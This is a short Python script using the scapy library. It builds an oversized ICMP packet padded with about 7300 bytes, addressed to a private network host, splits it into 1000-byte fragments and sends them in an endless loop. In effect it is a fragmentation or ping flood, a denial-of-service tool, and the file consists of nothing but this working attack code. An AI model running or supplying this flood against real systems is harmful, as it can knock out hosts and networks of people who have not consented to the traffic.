from scapy.all import *

z = "Q" * 7300
packet = IP(dst="192.168.178.81")/ICMP()/("\x00\x00"+ z)


while True:
    frags = fragment(packet, fragsize=1000)
    for frag in frags:
        send(frag)


